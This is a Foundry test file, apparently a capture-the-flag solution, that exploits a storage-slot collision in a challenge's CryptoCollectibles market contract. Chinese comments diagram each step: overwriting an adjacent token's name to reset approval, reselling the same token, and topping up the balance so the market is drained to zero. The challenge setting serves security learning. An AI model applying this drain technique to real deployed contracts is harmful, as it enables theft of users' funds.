// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.7.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../../src/09.market/Setup.sol";

contract attackTest is Test {
    Setup public level;

    EternalStorageAPI public eternalStorage; // 存储
    CryptoCollectibles public token; // 业务逻辑
    CryptoCollectiblesMarket public market; // 市场

    function setUp() public {
        // 部署
        payable(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4).transfer(100 ether);
        vm.startBroadcast(address(0x5B38Da6a701c568545dCfcB03FcB875f56beddC4));

        level = new Setup{value: 50 ether}();
        eternalStorage = level.eternalStorage();
        token = level.token();
        market = level.market();

        vm.stopBroadcast();
    }

    function test_isComplete() public{
        console.log("1.market init balance:",address(market).balance);
        // 1.mint token0, 至少要稍微大于50ETH，因为后面要额外扣除原来50ETH剩下的手续费
        /*
            tokenId_0.name:token_0
            tokenId_0.owner:address(this)
            tokenId_0.approval:0                    tokenId_1.name
            tokenId_0.metadata:0                    tokenId_1.owner
                                                    tokenId_1.approval
                                                    tokenId_1.metadata
         */
        // market: 100ETH + 50ETH
        bytes32 token_0 = market.mintCollectibleFor{value: 100 ether}(address(this));
        console.log("2.market mint token0:",address(market).balance);

        // 2.修改token_0.metadata, 让它等于address(this)
        /*
            tokenId_0.name:token_0
            tokenId_0.owner:address(this)
            tokenId_0.approval:0                    tokenId_1.name
            tokenId_0.metadata:address(this)        tokenId_1.owner
                                                    tokenId_1.approval
                                                    tokenId_1.metadata
         */
        // market: 100ETH + 50ETH
        eternalStorage.updateMetadata(token_0, address(this));

        // 3.approve token
        /*
            tokenId_0.name:token_0
            tokenId_0.owner:address(this)
            tokenId_0.approval:market               tokenId_1.name
            tokenId_0.metadata:address(this)        tokenId_1.owner
                                                    tokenId_1.approval
                                                    tokenId_1.metadata
         */
        // market: 100ETH + 50ETH
        token.approve(token_0, address(market));

        // 4.卖出该token_0, tokenId为token_0
        /*
            tokenId_0.name:token_0
            tokenId_0.owner:market
            tokenId_0.approval:0                    tokenId_1.name
            tokenId_0.metadata:address(this)        tokenId_1.owner
                                                    tokenId_1.approval
                                                    tokenId_1.metadata
         */
        // market: 100ETH's fee + 50ETH
        console.log("3.market sell token0:",address(market).balance);
        market.sellCollectible(token_0);

        // 5.get token_1
        /*
            tokenId_0.name:token_0
            tokenId_0.owner:market
            tokenId_0.approval:0                    tokenId_1.name
            tokenId_0.metadata:address(this)        tokenId_1.owner
                                                    tokenId_1.approval
                                                    tokenId_1.metadata
         */
        // market: 100ETH's fee + 50ETH
        bytes32 token_1 = bytes32(uint256(token_0)+2);

        // 6.updateName->approval
        /*
            tokenId_0.name:token_0
            tokenId_0.owner:market
            tokenId_0.approval:0                    tokenId_1.name:address(this)
            tokenId_0.metadata:address(this)        tokenId_1.owner
                                                    tokenId_1.approval
                                                    tokenId_1.metadata
         */
        // 注意，这里tokenId_1是address，因此可以直接调用存储合约的更新名字方法
        // market: 100ETH's fee + 50ETH
        eternalStorage.updateName(token_1, bytes32(uint256(address(this))));

        // 7.transferFrom
        /*
            tokenId_0.name:token_0
            tokenId_0.owner:address(this)
            tokenId_0.approval:0                    tokenId_1.name:address(this)
            tokenId_0.metadata:address(this)        tokenId_1.owner
                                                    tokenId_1.approval
                                                    tokenId_1.metadata
         */
        // 注意，tokenId_0的approval被重新赋值为address(this)，因此我们有权转移
        // market: 100ETH's fee + 50ETH
        token.transferFrom(token_0, address(market), address(this));

        // 8.将token_0再次卖出
        /*
            tokenId_0.name:token_0
            tokenId_0.owner:address(this)
            tokenId_0.approval:market               tokenId_1.name:market
            tokenId_0.metadata:address(this)        tokenId_1.owner
                                                    tokenId_1.approval
                                                    tokenId_1.metadata
         */
        // market: 100ETH's fee + 50ETH
        token.approve(token_0, address(market));

        // 计算：token0的价格
        uint tokenPrice = uint256(100 ether) * 10000 / (10000 + 1000);
        // 缺失的钱 = token0的价格 - market剩余的金额
        // 为什么要算这个呢？因为我们可以再次取出token0，得到token0的价格，
        // 但是market中并没有这么多余额，会报错，因此我们需要再次mint来存入一点钱，
        // 使得market的余额刚好等于token0的价格，这样我们再次取出token0的时候，
        // market就刚好没钱了
        uint missingBalance = tokenPrice - address(market).balance;

        //补偿缺少的ETH
        /*
            tokenId_0.name:token_0
            tokenId_0.owner:address(this)
            tokenId_0.approval:market               tokenId_1.name:market
            tokenId_0.metadata:address(this)        tokenId_1.owner
                                                    tokenId_1.approval
                                                    tokenId_1.metadata
         */
        // market: 100ETH's fee + 50ETH + missingBalance = token0's price
        market.mintCollectible{value:missingBalance}();
        console.log("4.market mint another token:",address(market).balance);
        // sellAgain
        /*
            tokenId_0.name:token_0
            tokenId_0.owner:address(this)
            tokenId_0.approval:market               tokenId_1.name:market
            tokenId_0.metadata:address(this)        tokenId_1.owner
                                                    tokenId_1.approval
                                                    tokenId_1.metadata
         */
        // market: 0ETH
        market.sellCollectible(token_0);
        console.log("5.market after attack:",address(market).balance);

        assertEq(level.isSolved(), true);
        
    }

    receive() external payable{} // 用于接收ETH

}